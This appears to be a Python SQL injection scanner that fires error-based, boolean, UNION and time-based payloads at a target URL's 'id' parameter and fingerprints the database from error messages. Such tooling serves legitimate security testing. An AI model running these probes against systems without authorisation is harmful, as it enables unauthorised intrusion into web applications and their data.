import requests
import time

def error_based_sqli(target):
    error_strings = [
        "you have an error in your sql syntax;",
        "warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated",
        "sql error"
    ]
    payload = "'"
    url = f"{target}?id={payload}"
    result = "[*] Testing Error-Based SQL Injection...\n"
    try:
        r = requests.get(url)
        for err in error_strings:
            if err.lower() in r.text.lower():
                result += f"[!] Error-based SQLi detected: {err}\n"
                return result
    except Exception as e:
        result += f"[!] Error occurred: {e}\n"
        return result
    result += "[+] No error-based SQLi detected.\n"
    return result

def time_based_sqli(target):
    payload = "'; IF(1=1) WAITFOR DELAY '00:00:05'--"
    url = f"{target}?id={payload}"
    result = "[*] Testing Time-Based SQL Injection...\n"
    start = time.time()
    try:
        requests.get(url, timeout=10)
    except requests.exceptions.Timeout:
        result += "[!] Timeout occurred – possible time-based SQLi.\n"
        return result
    elapsed = time.time() - start
    if elapsed > 5:
        result += "[!] Time-based SQLi likely (delayed response).\n"
    else:
        result += "[+] No time-based SQLi detected.\n"
    return result

def union_based_sqli(target):
    test_payloads = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL, NULL--",
        "' UNION SELECT 1, 'abc'--"
    ]
    result = "[*] Testing Union-Based SQL Injection...\n"
    for payload in test_payloads:
        try:
            url = f"{target}?id={payload}"
            r = requests.get(url)
            if "abc" in r.text or "NULL" in r.text:
                result += f"[!] UNION-based SQLi detected with payload: {payload}\n"
                return result
        except Exception:
            continue
    result += "[+] No UNION-based SQLi detected.\n"
    return result

def boolean_based_sqli(target):
    true_payload = "' AND 1=1--"
    false_payload = "' AND 1=2--"
    result = "[*] Testing Boolean-Based SQL Injection...\n"
    try:
        normal = requests.get(target)
        true_resp = requests.get(f"{target}?id={true_payload}")
        false_resp = requests.get(f"{target}?id={false_payload}")
        if true_resp.text != false_resp.text and true_resp.text == normal.text:
            result += "[!] Boolean-based blind SQLi detected!\n"
            return result
    except Exception as e:
        result += f"[!] Error: {e}\n"
        return result
    result += "[+] No boolean-based SQLi detected.\n"
    return result

def detect_db_type(target):
    payload = "'"
    db_types = {
        "MySQL": "You have an error in your SQL syntax;",
        "PostgreSQL": "pg_query",
        "MSSQL": "unclosed quotation mark",
        "Oracle": "quoted string not properly terminated",
    }
    result = "[*] Attempting to fingerprint database...\n"
    try:
        r = requests.get(f"{target}?id={payload}")
        for db, signature in db_types.items():
            if signature.lower() in r.text.lower():
                result += f"[~] Database type may be: {db}\n"
                return result
    except Exception as e:
        result += f"[!] Error: {e}\n"
        return result
    result += "[~] Could not determine DB type.\n"
    return result

def scan_sql_injection(target):
    output = ""
    output += error_based_sqli(target)
    output += boolean_based_sqli(target)
    output += union_based_sqli(target)
    output += time_based_sqli(target)
    output += detect_db_type(target)
    return output
